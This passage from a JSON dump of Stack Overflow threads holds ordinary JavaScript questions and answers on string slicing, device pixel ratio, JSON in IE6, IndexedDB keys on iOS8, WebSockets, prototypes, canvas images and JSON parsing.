assets.</p>\n\n<p>Thanks to the ones who helped me for my investigations :). </p>\n\n<p>Kulgar. </p>\n",
            "last_activity_date": 1386754363,
            "question_id": 8170039,
            "score": 19,
            "tags": [
                "javascript",
                "ruby-on-rails",
                "ruby",
                "asset-pipeline",
                "development-environment"
            ],
            "title": "Ruby On Rails 3.1 - assets pipeline - assets rendered twice"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You could do it without arrays, but it would take more code and be less readable. </p>\n\n<p>Generally, you only want to use as much code to get the job done, and this also increases readability. If you find this task is becoming a performance issue (benchmark it), <em>then</em> you can decide to start refactoring for performance.</p>\n\n<pre><code>var str = 'this.those.that',\n    delimiter = '.',\n    start = 1,\n    tokens = str.split(delimiter).slice(start),\n    result = tokens.join(delimiter); // those.that\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/alexdickson/zZKgd/\">jsFiddle</a>.</p>\n",
                    "is_accepted": true,
                    "score": 38
                },
                {
                    "body": "<p>I'm perplexed as to why you want to do things purely with string functions, but I guess you could do something like the following:</p>\n\n<pre><code>//str       - the string\n//c         - the character or string to search for\n//n         - which occurrence\n//fromStart - if true, go from beginning to the occurrence; else go from the occurrence to the end of the string\nvar cut = function (str, c, n, fromStart) {\n    var strCopy = str.slice(); //make a copy of the string\n    var index;\n    while (n &gt; 1) {\n        index = strCopy.indexOf(c)\n        strCopy = strCopy.substring(0, index)\n        n--;\n    }\n\n    if (fromStart) {\n        return str.substring(0, index);\n    } else {\n        return str.substring(index+1, str.length);\n    }\n}\n</code></pre>\n\n<p>However, I'd strongly advocate for something like alex's much simpler code.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>If you really want to stick to string methods, then:</p>\n\n<pre><code>// Return a substring of s upto but not including\n// the nth occurence of c\nfunction getNth(s, c, n) {\n  var idx;\n  var i = 0;\n  var newS = '';\n  do {\n    idx = s.indexOf(c);\n    newS += s.substring(0, idx);\n    s = s.substring(idx+1);\n  } while (++i &lt; n &amp;&amp; (newS += c))\n  return newS;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Try this :</p>\n\n<pre><code>\"qwe.fs.xczv.xcv.xcv.x\".replace(/([^\\.]*\\.){3}/, '');\n\"xcv.xcv.x\"\n</code></pre>\n\n<p><code>\"qwe.fs.xczv.xcv.xcv.x\".replace(/([^\\.]*\\.){**nth**}/, '');</code> - where is nth is the amount of occurrence to remove.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>What I want to do is take a string such as <code>this.those.that</code> and get a substring to or from the nth occurrence of a character. So, from the start of the string to the 2nd occurrence of <code>.</code> would return <code>this.those</code>. Likewise, from the 2nd occurrence of <code>.</code> to the end of the string would return <code>that</code>. Sorry if my question is foggy, it's not that easy to explain. Also, please do not suggest making extra variables, and the result will be in a string and not an array.</p>\n",
            "last_activity_date": 1382096482,
            "question_id": 5494691,
            "score": 19,
            "tags": [
                "javascript",
                "string",
                "substring",
                "slice"
            ],
            "title": "Cutting a string at nth occurrence of a character"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I would suggest using the following methode (it's a bit dirty though).</p>\n\n<p>Css:</p>\n\n<pre><code>.defaultEm{\n    font-size: 10px;\n    border: none;\n    margin: 0;\n    padding: 0;\n}\n</code></pre>\n\n<p>Javascript:</p>\n\n<pre><code>/**\n * This function is used to get the default font size\n *\n * @author public domain\n * @param pa (parent, if left out document.body will be used)\n * @returns Array{\"width\":theWidth, \"height\":theHeight}\n */\nfunction getDefaultFontSize(pa){\n// If pa is null then document.body will be used\npa = pa || document.body;\n\n// Create a temp div;\nvar who = document.createElement('div');\n\n// Set the className\nwho.className = 'defaultEm';\n\n//  Create the letter M ans apend it to the div\nwho.appendChild(document.createTextNode('M'));\n\n// Append the div to the parent element\npa.appendChild(who);\n\n// Get the size of the Div\nvar fs = {\"width\":who.offsetWidth, \"height\":who.offsetHeight};\n\n// Remove the div from the parent\npa.removeChild(who);\n\n// Return the font size\nreturn fs;\n}\n\n\nvar fonth = getDefaultFontSize().height;\nvar devicepx = fonth/10;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can use <strong>window.devicePixelRatio</strong> in Webkit based browsers to get the device pixel ratio directly in javascript. I have used this on Google Chrome, Android browsers (2.2+) and Mobile Safari. I have no idea about other browsers though.</p>\n",
                    "is_accepted": false,
                    "score": 32
                }
            ],
            "body": "<p>I want to find the ratio between CSS pixels and device pixels.</p>\n\n<p><strong>Edit</strong>: I should have realized that this is just zoom level. I've <a href=\"http://stackoverflow.com/questions/1713771/how-to-detect-page-zoom-level-in-all-modern-browsers/5078596#5078596\">added an answer</a> to the canonical reference on zoom levels.</p>\n\n<p>CSS pixels are the unit we use for almost everything--it's what element.style.width, element.clientWidth, element.offsetWidth etc. mean. Device pixels are the pixels that the browser actually paints to. A few properties are measured in device pixels, e.g. window.screen.width, which is the screen size (e.g. 1024) that doesn't change when the user zooms in.</p>\n\n<p>Motivation: when the user zooms in, I want to increase a canvas's width and height (while keeping style.width and style.height the same CSS pixel value), scale() the context, and redraw on a crisper upscaled canvas.</p>\n\n<p>I've read <a href=\"http://www.quirksmode.org/mobile/viewports.html\">Quirksmode's A Tale of Two Viewports</a> and <a href=\"http://www.webkit.org/blog/55/high-dpi-web-sites/\">High DPI on Surfin' Safari</a>, but neither of them say how to get the ratio. The only ideas I have so far are to collect mousemoves and measure change in event.clientX divided by change in event.screenX, or to programatically create media queries using <code>moz--min-device-pixel-ratio</code>, use <code>getComputedStyle()</code> to test whether the rule matched, and narrow it down with a binary search. I hope there's a easier/more reliable way.</p>\n\n<p><strong>Edit</strong>: I've tried using the <code>@media (-webkit-min-device-pixel-ratio:1)</code> queries with Chrome, Safari, and Firefox 4, and apparently Webkit treats the property as a constant device pixel to <strong>screen pixel</strong> ratio (which doesn't change with zoom), whereas Firefox 4 treats it as device pixel to <strong>CSS pixel</strong> ratio (which increases when you zoom in). So in Firefox 4, I can discover the CSS pixel / device pixel ratio using a binary search, but not with Webkit.</p>\n",
            "last_activity_date": 1317024777,
            "question_id": 5063489,
            "score": 19,
            "tags": [
                "javascript",
                "css",
                "html5"
            ],
            "title": "How can you get the CSS pixel / device pixel ratio?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Your version of firefox might be having built-in support for the JSON library. But ideally you should include the JSON js library from json.org (make a copy of it in your hosted domain).</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Simply check for <code>JSON.stringify</code> and if it doesn't exist, use some other method to parse data into a JSON string.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The json2 library at <a href=\"https://github.com/douglascrockford/JSON-js\">https://github.com/douglascrockford/JSON-js</a> is exactly what you're looking for. You can include it unconditionally, and it adds JSON.parse and JSON.stringify to your global namespace (only if there isn't one defined yet). It won't mess with any built-in JSON. From its source:</p>\n\n<pre><code>if (!this.JSON) {\n    this.JSON = {};\n}\n...\nif (typeof JSON.stringify !== 'function') {\n...\nif (typeof JSON.parse !== 'function') {\n</code></pre>\n\n<p>That's comprehensive! Even if for some reason you already have JSON.stringify but not JSON.parse (or vice versa) it'll still do the right thing, leaving the original ones in place.</p>\n",
                    "is_accepted": true,
                    "score": 32
                },
                {
                    "body": "<p>Use the JSON-js made avaliable on Github by Douglas Crockford it makes the JSOn object avaliable in browsers which dont support the JSOn object natively just include a single js file in ur page which uses JSOn object. <a href=\"https://github.com/douglascrockford/JSON-js\" rel=\"nofollow\">https://github.com/douglascrockford/JSON-js</a></p>\n\n<p>Also Check out this link <a href=\"http://json.org/js.html\" rel=\"nofollow\">http://json.org/js.html</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I also met this issue, you can load json2.js before using JSON. refer to this <a href=\"https://github.com/douglascrockford/JSON-js\" rel=\"nofollow\">link</a>. </p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Hi\nQuick questions that probably a piece of cake for someone in the know to asnwer.</p>\n\n<p>I have a simple asp.net website that uses JSON for a bunch of stuff (and JSON.stringify)</p>\n\n<p>All good in firefox etc, yet, in IE6 I run into an error with JSON being undefined.</p>\n\n<p>Is there a way I can include a JSON implementation without breaking what I have already (using the native JSON objects in the other browsers).\nIf so, how?</p>\n\n<p>Thanks!</p>\n",
            "last_activity_date": 1354604215,
            "question_id": 1787020,
            "score": 19,
            "tags": [
                "javascript",
                "json",
                "internet-explorer"
            ],
            "title": "JSON object in IE6 - How?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p><a href=\"http://plugins.jquery.com/project/treeview\">jQuery TreeView plugin</a> it's really good and it haves very nice <a href=\"http://jquery.bassistance.de/treeview/demo/async.html\">asynchronous</a> <a href=\"http://jquery.bassistance.de/treeview/demo/source.phps\">JSON</a> loading capabilities...</p>\n\n<p><a href=\"http://extjs.com/deploy/dev/examples/tree/reorder.html\">ExtJS TreeView Component</a>, also great, multi-level asynchronous loading, excelent for large trees.</p>\n",
                    "is_accepted": true,
                    "score": 23
                },
                {
                    "body": "<p>I suggest DHTMLX Tree:</p>\n\n<ul>\n<li>Cross Browser  </li>\n<li>AJAX Support  </li>\n<li>In-line node editing   </li>\n<li>Drag-n-drop capabilities</li>\n<li>*Smart Rendering - allows avoiding performance problems in trees with great number of nodes per level.  </li>\n<li><p>Rich Client API</p></li>\n<li><p>Special techniques implemented into the component make loading of really big trees fast and effective. </p></li>\n<li><p>Advanced drag-and-drop makes it possible to drag items not just within one tree, but between different ones (even if trees are located in different frames or iframes). </p></li>\n</ul>\n\n<p>You can try this functionality right now:</p>\n\n<p><a href=\"http://dhtmlx.com/docs/products/dhtmlxTree/index.shtml\">Live Demo</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<p>What are some of the better AJAX Treeviews out there that support asynchronous JSON loading.</p>\n\n<p>YUI TreeView seems nice, but bloated with tables, etc.</p>\n",
            "last_activity_date": 1255683247,
            "question_id": 220754,
            "score": 19,
            "tags": [
                "javascript",
                "ajax",
                "json",
                "treeview"
            ],
            "title": "Best AJAX TreeView"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I can confirm that iOS8 is definitely buggy here. I tried a few workarounds, but the best I can suggest is a primary key that combines some unique string, like the name of the objectStore, with a number. So for example, given two objectStores called people and notes, I'd store data with keys like so:</p>\n\n<p>people/X\nnotes/X</p>\n\n<p>You can set X manually, or, use the .count() method on the objectStore to find the count and add one. Here is an example:</p>\n\n<pre><code>//Define a person\nvar person = {\n    name:\"Ray\",\n    created:new Date().toString(),\n}\n\n//Perform the add\ndb.transaction([\"people\"],\"readwrite\").objectStore(\"people\").count().onsuccess = function(event) {\n    var total = event.target.result;\n    console.log(total);\n    person.id = \"person/\" + (total+1);\n\n    var request = db.transaction([\"people\"],\"readwrite\").objectStore(\"people\").add(person);\n\n    request.onerror = function(e) {\n        console.log(\"Error\",e.target.error.name);\n        //some type of error handler\n    }\n\n    request.onsuccess = function(e) {\n        console.log(\"Woot! Did it\");\n    }\n\n}\n</code></pre>\n\n<p>Note that I specified keyPath of \"id\" for this OS. </p>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>I had a similar problem however my first insert to the objectstore was a small array with just username and email and the second objectstore was very large with several nested arrays of data.</p>\n\n<p>My insert method below would call back success on the all items however only the second object store would be written to the db correctly.</p>\n\n<p>When I tried reversing the order I was writing to the database (writing the large objectstore items first and the username/email second) both objectstores were written correctly however the the primary keys were shared between the two objects stores.\nPilots Primary Key: 1,2,3,4,5\nAC Primary Key: 6,7,8...</p>\n\n<pre><code>function insert_GroupRecord(Record, Store){\n//update individual sync record\nvar trans = dbGroup.transaction([Store],\"readwrite\");\nvar store = trans.objectStore(Store);\nvar request = store.put(Record);\nrequest.onsuccess = function(e){\n    IOS_postMessage({Message:\"SyncStatus\", status:\"Group_Insert \"+Store});\n};\nrequest.onerror = function(e){\n    GroupSyncERROR = true;\n    //IOS_postMessage({Message:\"SyncStatus\", status:\"GroupSyncFail \"+Store});\n};\n</code></pre>\n\n<p>}</p>\n\n<pre><code>request.onupgradeneeded = function(evt){\n    var objectStore = evt.currentTarget.result.createObjectStore(\"AC\",{ keyPath: \"id\", autoIncrement: true });\n    objectStore.createIndex(\"ident\", \"ident\", { unique: true });\n    var objectStore2 = evt.currentTarget.result.createObjectStore(\"Pilots\",{ keyPath: \"id\", autoIncrement: true });\n    objectStore2.createIndex(\"chatname\", \"chatname\", { unique: true });\n    console.log(\"KFM_Group Upgrade Completed\");\n\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>The issue is when you have two different object stores in the same indexeddb, primary key values appear to be \"shared\" across all stores.</p>\n\n<pre><code>&lt;body&gt;\n    &lt;script type=\"text/javascript\"&gt;\n        //prefixes of implementation that we want to test\nwindow.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;\n\n//prefixes of window.IDB objects\nwindow.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction;\nwindow.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange\n\nif (!window.indexedDB) {\n    window.alert(\"Your browser doesn't support a stable version of IndexedDB.\")\n}\n\n\nvar db;\nvar request = window.indexedDB.open(\"newDatabase\", 4);\n\nrequest.onerror = function(event) {\n  console.log(\"error: \");\n};\n\nrequest.onsuccess = function(event) {\n  db = request.result;\n  console.log(\"success: \"+ db);\n};\n\nrequest.onupgradeneeded = function(event) {\n        var db = event.target.result;\n        var objectStore = db.createObjectStore(\"customers\", {keyPath: \"arseid\"});\n    var objectStore = db.createObjectStore(\"test\", {keyPath: \"id\"});\n}\n\n\n\nfunction add1() {\n        var x = new Date();\n    var h1 = x.getHours();\n    var m1 = x.getMinutes();\n    var s1 = x.getSeconds();\n    console.log('starting insert on ' +  h1 + ':' + m1 + ':' + s1);\n\n    var tx = db.transaction([\"customers\"], \"readwrite\");\n    for (var i = 0; i &lt; 1000; i++) {\n        var request = tx.objectStore(\"customers\")\n                .put({ arseid: i, name: \"Jonathan Smith\", email: \"jonathan.smith@anemailaddress.com\", favourite: \"chocolate cake\", pet: \"rudolph the red nose reindeer\", address: \"999 letsbe avenue, townton, countyshire\" });\n    }\n\n\n    tx.oncomplete = function (e) {\n            // Re-render all the todo's\n            var x2 = new Date(); \n            var h2 = x2.getHours(); \n            var m2 = x2.getMinutes(); \n            var s2 = x2.getSeconds(); \n               console.log('transaction complete ' + h2 + ':' + m2 + ':' + s2);\n        }\n}\n\n\nfunction add2() {\n    //tx 2\n    var tx2 = db.transaction([\"test\"], \"readwrite\");\n    for (var i = 0; i &lt; 1000; i++) {\n        var request2 = tx2.objectStore(\"test\")\n                .put({ id: i, name: \"Robwin Mwengway\", email: \"jonathan.smith@anemailaddress.com\", favourite: \"chocolate cake\", pet: \"rudolph the red nose reindeer\", address: \"999 letsbe avenue, townton, countyshire\" });\n    }\n\n    tx2.oncomplete = function (e) {\n            var x3 = new Date(); \n            var h3 = x3.getHours(); \n            var m3 = x3.getMinutes(); \n            var s3 = x3.getSeconds(); \n               console.log('transaction complete ' + h3 + ':' + m3 + ':' + s3);\n        }\n}\n\n\n    &lt;/script&gt;\n&lt;button onclick=\"add1()\"&gt;Add1 data to indexedDb&lt;/button&gt;\n&lt;button onclick=\"add2()\"&gt;Add2 data to indexedDb&lt;/button&gt;\n&lt;/body&gt;\n</code></pre>\n\n<p>(Fiddle: [<a href=\"http://jsfiddle.net/jonnyknowsbest/4pdp8vxe/]\">http://jsfiddle.net/jonnyknowsbest/4pdp8vxe/]</a>)</p>\n\n<p>In iOS8, if you run up the fiddle and click \"Add1 data to IndexedDb\", then 1000 entries get added to the \"customers\" table. If you then click \"Add2 data to IndexedDb\", then 1000 entries get added to the \"suppliers\" table, but the 1000 from the \"customers\" is removed.</p>\n\n<p>Has anyone else come across this? Is this part of the IndexedDb specification? Chrome does not seem to have this problem.</p>\n\n<p>EDIT: Found this <a href=\"http://www.w3.org/TR/IndexedDB/#object-store-concept\">W3 Org IndexedDB Recommendation</a>: \"There can never be multiple records in a given object store with the same key.\" Apple seem to have applied this at the database level.</p>\n",
            "last_activity_date": 1412262911,
            "question_id": 26019147,
            "score": 18,
            "tags": [
                "javascript",
                "mobile-safari",
                "ios8",
                "indexeddb"
            ],
            "title": "Primary Key issue on iOS8 implementation of IndexedDb"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>It appears to be using HTML 5 <a href=\"http://www.w3.org/TR/websockets/\">Web Sockets</a>. They basically keep an open connection between the server and the client and, among many other things, allow the client to define event handlers to treat new data when received from the server.</p>\n\n<p>Here you'll find some basic examples and concepts about WebSockets: <a href=\"http://www.html5rocks.com/en/tutorials/websockets/basics/\">Introducing WebSockets: Bringing sockets to the web</a>. </p>\n\n<blockquote>\n  <p>The WebSocket specification defines an API establishing \"socket\"\n  connections between a web browser and a server. In plain words: There\n  is an persistent connection between the client and the server and both\n  parties can start sending data at any time.</p>\n</blockquote>\n\n<p>There is also a <a href=\"http://html5demos.com/web-socket\">live demo</a> with server &amp; client <a href=\"http://github.com/remy/html5demos/tree/master/server/\">source code</a> available.</p>\n\n<p>You might also find the following question useful: <a href=\"http://stackoverflow.com/q/10808924/851811\">How do real time updates work?</a></p>\n",
                    "is_accepted": true,
                    "score": 11
                },
                {
                    "body": "<p>To add to <a href=\"http://stackoverflow.com/a/12425783/105570\">Xavi's answer</a>, if you want to get started with web sockets without having to understand all the internals, you might try out <a href=\"http://pusher.com/\" rel=\"nofollow\">Pusher</a>, a library for multiple platforms (including PHP) that makes push notifications on the web very straightforward.</p>\n\n<p>I do not work for Pusher; it's just a product I've found very useful in the past. I've always used the free version for small personal projects, though I would probably pay if I ever used it on a larger application.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>How does Stack Overflow show the answer added/edited message without a page reload?</p>\n\n<p><img src=\"http://i.stack.imgur.com/XJ5Wx.jpg\" alt=\"enter image description here\"></p>\n\n<p>Yes, I know it will happen with Ajax. So I opened Firebug in a browser to check it, to see whether any requests are coming in a particular interval of time.\nBut I don't see any request coming in Firebug. </p>\n\n<p>Can we perform a request without it showing in Firebug?\nAre there any other ideas behind this or is my concept totally wrong?</p>\n",
            "last_activity_date": 1347631920,
            "question_id": 12425304,
            "score": 18,
            "tags": [
                "javascript",
                "html",
                "ajax",
                "http",
                "web"
            ],
            "title": "How does Stack Overflow notify of server-side events without a page reload? I see no request in Firebug"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>In JavaScript, function objects have a built-in <code>.prototype</code> property. The value of this property is an object. If the function is used as a constructor, the resulting instances inherit from that \"prototype\" object.</p>\n\n<p>Example:</p>\n\n<pre><code>var Dog = function () {}; // the constructor function\n\nDog.prototype.bark = function () {}; // adding a method to Dog.prototype\n\nvar dog1 = new Dog; // creating a new instance\n\ndog1.bark(); // the instance inherits the \"bark\" method from Dog.prototype\n</code></pre>\n\n<p>Note that the <code>.prototype</code> property (of function objects) is not the same as the <code>[[Prototype]]</code> internal property. All objects contain the latter. It's an internal reference to an object's prototype. (In the above example, the <code>dog1</code> object's <code>[[Prototype]]</code> refers to <code>Dog.prototype</code>.) On the other hand, only function objects have a built-in <code>.prototype</code> property (which makes sense since only function objects can be used as constructors).</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<pre><code>var foo = function () {};\nfoo.bar = 5;\nfoo.prototype.foobar = 10;\n\nvar x = new foo();\nx.bar; // undefined\nx.foobar; // 10\n</code></pre>\n\n<p>Edit: Also, you can then do</p>\n\n<pre><code>foo.prototype.foobar = 20;\nx.foobar; // 20\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>\"Prototype\" is something that plays a role in objects.</p>\n\n<p>In Javascript, everything is an object. Every object has a kind, and thus inherits the <code>prototype</code> of that kind.</p>\n\n<p>For example, take a simple array: <code>var a = []</code>. You can make operations with it, like <code>a.push(10)</code>. Where does this <code>push</code> method come from? From the prototype of <code>Array</code> object, which <code>a</code> is.</p>\n\n<p>You can add your own methods to <code>Array</code> objects just by defining them in the <code>prototype</code> object. For example:</p>\n\n<pre><code>Array.prototype.sortNum = function() {this.sort(function(a, b) {return a - b});};\n</code></pre>\n\n<p>This way you can do something like <code>a.sortNum()</code> with <em>all</em> arrays, even the ones created before you defined the <code>sortNum</code> method.</p>\n\n<p>(Note: for compatibility reasons, it's usually not recommended to extend the prototype of native objects like <code>Array</code>s. But this particular example is usually a welcome addition, as well as normalizing methods like <code>map</code> and <code>forEach</code> for older browsers.)</p>\n\n<p>(Just <strong>never ever</strong> extend <code>Object.prototype</code>! Unless you don't care to mess up <code>for...in</code> statements, the <code>in</code> operator and these sort of cases.)</p>\n\n<p>If you want to define your own classes, like the name <code>MyConstructor</code> suggests, you'll have to define its <code>prototype</code> to define the methods for all the instances of that class:</p>\n\n<pre><code>function MyConstructor(name) {this.name = name};\nMyConstructor.prototype = {\n    print: function() {return this.name;}\n};\n\nvar mc = new MyConstructor(\"foo\");\nalert(mc.print()); // alerts \"foo\"\n</code></pre>\n\n<p>You can define more than just functions in <code>prototype</code>s, too:</p>\n\n<pre><code>MyConstructor.prototype.age = 30;\n\nalert(mc.age); // alerts 30\n</code></pre>\n\n<p>Watch out when you do this to define \"default\" object values, because changing it may cause a change in <em>all</em> instances of that class.</p>\n\n<p>But this comes handy with <code>Object.defineProperty</code>:</p>\n\n<pre><code>Object.defineProperty(MyConstructor.prototype, \"wholeString\", {\n    get: function() {return this.name + \"=\" + this.age;},\n    set: function(v) {this.name = v.substring(3);}\n});\n\nalert(mc.wholeString); // alerts \"foo = 30\"\n</code></pre>\n\n<p>(Unfortunately, IE&lt;9 allows this only for DOM objects...)</p>\n\n<p>When you define <code>MyConstructor.age = 30</code> instead, what you're actually doing is defining a member of the <em>function</em> <code>MyConstructor</code>, so <code>mc.age</code> would be undefined. Every instance of <code>MyConstructor</code> inherits the methods and members defined in <code>MyConstructor.prototype</code>, not the ones of the function <code>MyConstructor</code>.</p>\n\n<p>There's much more to say, actually. Objects can be of a subclass of another class, thus inheriting the <code>prototype</code> of the superclass, too. For example, <code>document.body</code> is an instance of <code>HTMLBodyElement</code>, which is a subclass of <code>HTMLElement</code>, which is a subclass of <code>Element</code> and so on, until you get <code>Object</code> as the upmost superclass. So, <code>document.body</code> inherits all the methods defined in the prototype of <code>HTMLBodyElement</code>, <code>HTMLElement</code>, <code>Element</code> and <code>Object</code>. This is called the prototype chain.</p>\n\n<p>Doing the same with custom objects is a bit tricky:</p>\n\n<pre><code>function Class() {};\nClass.prototype.foo = function() {alert(\"foo\");};\n\nfunction Subclass() {};\nSubclass.prototype = new Class();\nSubclass.prototype.bar = function() {alert(\"bar\");};\n\nvar a = new Class(), b = new Subclass();\na.foo(); // alerts\"foo\"\na.bar(); // throws an error\nb.foo(); // alerts \"foo\"\nb.bar(); // alerts \"bar\"\n\na instanceof Class;    // true\na instanceof Subclass; // false\nb instanceof Class;    // true\nb instanceof Subclass; // true\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 28
                }
            ],
            "body": "<p>What is prototype property? Why is it necessary? I have learnt so far that this provides a public access to more intrinsic and private [[prototype]] of the object? - What is [[prototype]] and why is it necessary.</p>\n\n<p>Also what is the difference in these two:</p>\n\n<pre><code>MyConstructor.age = 30;\nMyConstructor.prototype.age = 30;\n</code></pre>\n\n<p>In short would appreciate a better understanding of keyword prototype.</p>\n\n<p>Thanks</p>\n",
            "last_activity_date": 1366190710,
            "question_id": 12064104,
            "score": 18,
            "tags": [
                "javascript",
                "html5"
            ],
            "title": "Prototype keyword in Javascript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I assume you mean, to load an image into the canvas and not uploading the image from the canvas.</p>\n\n<p>It'd probably be a good idea to read through all the canvas articles they have over here\n<a href=\"https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Canvas_tutorial/Using_images\">https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Canvas_tutorial/Using_images</a></p>\n\n<p>But basically what you want to do is create an image in javascript, and set the image.src = to whatever the file location is. In the case of loading images from the user on their end, you're going to want to use the File System API.</p>\n\n<p>Threw together a brief example here: <a href=\"http://jsfiddle.net/influenztial/qy7h5/\">http://jsfiddle.net/influenztial/qy7h5/</a></p>\n\n<pre><code>function handleImage(e){\n    var reader = new FileReader();\n    reader.onload = function(event){\n        var img = new Image();\n        img.onload = function(){\n            canvas.width = img.width;\n            canvas.height = img.height;\n            ctx.drawImage(img,0,0);\n        }\n        img.src = event.target.result;\n    }\n    reader.readAsDataURL(e.target.files[0]);     \n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 45
                },
                {
                    "body": "<pre><code>&lt;script&gt;\nwindow.onload = function() {\nvar canvas=document.getElementById(\u201cdrawing\u201d); // grabs the canvas element\nvar context=canvas.getContext(\u201c2d\u201d); // returns the 2d context object\nvar img=new Image() //creates a variable for a new image\n\nimg.src= \u201cimages/vft.jpg\u201d // specifies the location of the image\ncontext.drawImage(img,20,20); // draws the image at the specified x and y location\n}\n&lt;/script&gt;\n</code></pre>\n\n<p>Check <a href=\"http://www.pageresource.com/html5/insert-image-in-canvas/\" rel=\"nofollow\">Demo</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am currently using <a href=\"http://paperjs.org\">http://paperjs.org</a> to create an HTML5 canvas drawing app. I want to let users upload images into the canvas. I know I need to make a login and signup but is there an easier way? I have seen the HTML5 drag and drop upload.</p>\n",
            "last_activity_date": 1393508543,
            "question_id": 10906734,
            "score": 18,
            "tags": [
                "javascript",
                "html5"
            ],
            "title": "How to upload image into HTML5 canvas"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Javascript has a built in JSON parse for strings, which I think is what you have:</p>\n\n<pre><code>var myObject = JSON.parse(\"my json string\");\n</code></pre>\n\n<p>to use this with your example would be:</p>\n\n<pre><code>var jsonData = JSON.parse(myMessage);\nfor (var i = 0; i &lt; jsonData.counters.length; i++) {\n    var counter = jsonData.counters[i];\n    console.log(counter.counter_name);\n}\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/X6y5B/\">Here is a working example</a></p>\n\n<p><strong>EDIT</strong>: There is a mistake in your use of for loop (I missed this on my first read, credit to @Evert for the spot). using a for-in loop will set the var to be the index of the current loop, not the actually data. See my updated loop above for correct usage</p>\n\n<p><strong>IMPORTANT</strong>: the <code>JSON.parse</code> method wont work in old old browsers - so if you plan to make your website available through some sort of time bending internet connection, this could be a problem! If you really are interested though, <a href=\"http://caniuse.com/#search=JSON.parse\">here is a support chart</a> (which ticks all my boxes).</p>\n",
                    "is_accepted": true,
                    "score": 27
                },
                {
                    "body": "<p>You should post the error message you're getting when posting an error. </p>\n\n<p>That said, doesn't look like there's anything wrong with your json parsing, you just don't know yet how loops work.</p>\n\n<pre><code>for (var counter in jsonData.counters) {\n    console.log(jsonData.counters[counter].counter_name);\n}\n</code></pre>\n\n<p>This in itself can cause issues, if the array prototype is overloaded. Therefore, this is actually a better syntax:</p>\n\n<pre><code>for (var i=0; i&lt;jsonData.counters.length; i++) {\n    console.log(jsonData.counters[i].counter_name);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>In a for-in-loop the running variable holds the property name, not the property value.</p>\n\n<pre><code>for (var counter in jsonData.counters) {\n    console.log(jsonData.counters[counter].counter_name);\n}\n</code></pre>\n\n<p>But as counters is an Array, you have to use a normal for-loop:</p>\n\n<pre><code>for (var i=0; i&lt;jsonData.counters.length; i++) {\n    var counter = jsonData.counters[i];\n    console.log(counter.counter_name);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You should use a datastore and proxy in ExtJs. There are plenty of <a href=\"http://docs.sencha.com/ext-js/4-0/#!/api/Ext.data.reader.Json\" rel=\"nofollow\">examples</a> of this, and the JSON reader automatically parses the JSON message into the model you specified.</p>\n\n<p>There is no need to use basic Javascript when using ExtJs, everything is different, you should use the ExtJs ways to get everything right. Read there documentation carefully, it's good.</p>\n\n<p>By the way, these examples also hold for Sencha Touch (especially v2), which is based on the same core functions as ExtJs.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>This is my answer,</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;h2&gt;Create Object from JSON String&lt;/h2&gt;\n&lt;p&gt;\nFirst Name: &lt;span id=\"fname\"&gt;&lt;/span&gt;&lt;br&gt; \nLast Name: &lt;span id=\"lname\"&gt;&lt;/span&gt;&lt;br&gt; \n&lt;/p&gt; \n&lt;script&gt;\nvar txt = '{\"employees\":[' +\n'{\"firstName\":\"John\",\"lastName\":\"Doe\" },' +\n'{\"firstName\":\"Anna\",\"lastName\":\"Smith\" },' +\n'{\"firstName\":\"Peter\",\"lastName\":\"Jones\" }]}';\n\n//var jsonData = eval (\"(\" + txt + \")\");\nvar jsonData = JSON.parse(txt);\nfor (var i = 0; i &lt; jsonData.employees.length; i++) {\n    var counter = jsonData.employees[i];\n    //console.log(counter.counter_name);\n    alert(counter.firstName);\n}\n\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
